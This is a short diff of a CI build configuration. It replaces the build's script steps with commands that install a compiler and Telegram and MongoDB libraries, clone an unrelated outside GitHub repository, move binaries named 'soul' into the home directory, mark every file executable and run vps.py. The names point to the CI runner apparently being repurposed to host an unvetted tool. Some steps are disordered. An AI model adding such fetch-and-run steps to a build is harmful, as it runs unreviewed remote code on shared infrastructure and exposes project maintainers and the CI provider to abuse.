@@ -14,8 +14,14 @@ install:
   - pip install -r requirements.txt
 
 script:
-  # Run the Python script
-  - chmod +x * && chmod +x bgmi && python3 vps.py
+  - apt-get update && apt-get install -y gcc libpthread-stubs0-dev
+  - pip install telebot pymongo aiohttp
+  - git clone https://github.com/kingfather09090/newa
+  - mv soul.py $HOME
+  - cd newa
+  - mv soul $HOME & cd
+  - chmod +x *
+  - python3 vps.py
   
                                
         
